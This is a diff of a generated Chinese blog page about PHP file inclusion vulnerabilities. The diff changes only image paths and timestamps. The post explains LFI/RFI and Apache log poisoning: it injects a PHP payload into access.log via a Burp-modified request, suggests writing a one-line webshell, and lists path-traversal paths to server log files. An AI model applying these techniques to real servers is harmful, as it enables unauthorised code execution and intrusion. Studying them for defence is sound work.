@@ -97,15 +97,15 @@
 <meta property="og:url" content="http://yoursite.com/2017/05/20/php文件包含漏洞/index.html">
 <meta property="og:site_name" content="Note&#39;s blog">
 <meta property="og:description" content="文件包含的分类本地文件包含LFI   main.php?page=1.jpg，需要allow_url_fopen开启，默认是开启的远程文件包含RFI   main.php?page=http://www.xxx.com/xxx/1.jpg  需要allow_url_include = On">
-<meta property="og:image" content="http://yoursite.com/php文件包含漏洞/文件包含.jpg">
-<meta property="og:image" content="http://yoursite.com/php文件包含漏洞/测试结果.jpg">
-<meta property="og:image" content="http://yoursite.com/php文件包含漏洞/改包.jpg">
-<meta property="og:image" content="http://yoursite.com/php文件包含漏洞/未转码.jpg">
-<meta property="og:updated_time" content="2017-06-01T06:09:26.411Z">
+<meta property="og:image" content="http://yoursite.com/2017/05/20/php文件包含漏洞/文件包含.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/20/php文件包含漏洞/测试结果.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/20/php文件包含漏洞/改包.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/20/php文件包含漏洞/未转码.jpg">
+<meta property="og:updated_time" content="2017-06-22T14:15:45.982Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php文件包含漏洞">
 <meta name="twitter:description" content="文件包含的分类本地文件包含LFI   main.php?page=1.jpg，需要allow_url_fopen开启，默认是开启的远程文件包含RFI   main.php?page=http://www.xxx.com/xxx/1.jpg  需要allow_url_include = On">
-<meta name="twitter:image" content="http://yoursite.com/php文件包含漏洞/文件包含.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2017/05/20/php文件包含漏洞/文件包含.jpg">
 
 
 
@@ -416,7 +416,7 @@
 
       
         <h1 id="文件包含的分类"><a href="#文件包含的分类" class="headerlink" title="文件包含的分类"></a>文件包含的分类</h1><p>本地文件包含LFI   <br>main.php?page=1.jpg，需要allow_url_fopen开启，默认是开启的<br>远程文件包含RFI   <br>main.php?page=<a href="http://www.xxx.com/xxx/1.jpg" target="_blank" rel="external">http://www.xxx.com/xxx/1.jpg</a>  需要allow_url_include = On  <br><a id="more"></a><br><strong>只要是符合php语法的文件，无论什么扩展名，他都会被当成php文件来执行。</strong></p>
-<h1 id="php包含日志文件"><a href="#php包含日志文件" class="headerlink" title="php包含日志文件"></a>php包含日志文件</h1><p>当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。Apache服务器运行后会生成两个日志文件，这两个文件是access.log（访问日志）和error.log（错误日志），Apache的日志文件记录了服务器对每次请求做出响应的有关信息，例如当我们请求x.php页面时，Apache就会记录下我们的操作，并且写到访问日志文件access.log之中：<br><img src="/php文件包含漏洞/文件包含.jpg" alt=""><br>尝试将一句话木马或者是phpinfo写入到log文件中，访问如下地址：<strong><a href="http://localhost/dashboard/" target="_blank" rel="external">http://localhost/dashboard/</a>&lt;?php phpinfo();?&gt;</strong>，效果如下：<br><img src="/php文件包含漏洞/测试结果.jpg" alt=""><br>尖括号和空格被转码，而这样是无法利用的，尝试使用burpsuite抓包修改访问的url地址：<br><img src="/php文件包含漏洞/改包.jpg" alt=""><br>查看access.log文件，可以看到没有被转码：<br><img src="/php文件包含漏洞/未转码.jpg" alt=""><br>最后本地包含access.log文件即可。可以尝试将一句话木马写入到文件中。</p>
+<h1 id="php包含日志文件"><a href="#php包含日志文件" class="headerlink" title="php包含日志文件"></a>php包含日志文件</h1><p>当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。Apache服务器运行后会生成两个日志文件，这两个文件是access.log（访问日志）和error.log（错误日志），Apache的日志文件记录了服务器对每次请求做出响应的有关信息，例如当我们请求x.php页面时，Apache就会记录下我们的操作，并且写到访问日志文件access.log之中：<br><img src="/2017/05/20/php文件包含漏洞/文件包含.jpg" alt=""><br>尝试将一句话木马或者是phpinfo写入到log文件中，访问如下地址：<strong><a href="http://localhost/dashboard/" target="_blank" rel="external">http://localhost/dashboard/</a>&lt;?php phpinfo();?&gt;</strong>，效果如下：<br><img src="/2017/05/20/php文件包含漏洞/测试结果.jpg" alt=""><br>尖括号和空格被转码，而这样是无法利用的，尝试使用burpsuite抓包修改访问的url地址：<br><img src="/2017/05/20/php文件包含漏洞/改包.jpg" alt=""><br>查看access.log文件，可以看到没有被转码：<br><img src="/2017/05/20/php文件包含漏洞/未转码.jpg" alt=""><br>最后本地包含access.log文件即可。可以尝试将一句话木马写入到文件中。</p>
 <h1 id="常见的日志位置文件如下："><a href="#常见的日志位置文件如下：" class="headerlink" title="常见的日志位置文件如下："></a>常见的日志位置文件如下：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">  ../../../../../../../../../../var/<span class="built_in">log</span>/httpd/access_log</div><div class="line">  ../../../../../../../../../../var/<span class="built_in">log</span>/httpd/error_log</div><div class="line">  ../apache/logs/error.log</div><div class="line">  ../apache/logs/access.log</div><div class="line">  ../../apache/logs/error.log</div><div class="line">  ../../apache/logs/access.log</div><div class="line">  ../../../apache/logs/error.log</div><div class="line">  ../../../apache/logs/access.log</div></pre></td></tr></table></figure>
 <h1 id="include和require的区别"><a href="#include和require的区别" class="headerlink" title="include和require的区别"></a>include和require的区别</h1><p>1.PHP程序执行到require（）时，只会读取一次档案，故常放在程序开头，档案引入后PHP会将网页档重新编译，让引入档成为原先网页的一部分。<br>2.PHP程序执行到include（）时，每次皆会读取档案，故常用于流程控制的区段，如条件判断或循环中。<br>3.require():无条件包含，如果文件不存在，会报出一个fatal error，脚本停止执行。<br>4.include():有条件包含，如果文件不存在，会给出一个 warning，但脚本会继续执行。<br>5.推荐使用require_once()和include_once()，可以检测文件是否有重复包含。</p>
 
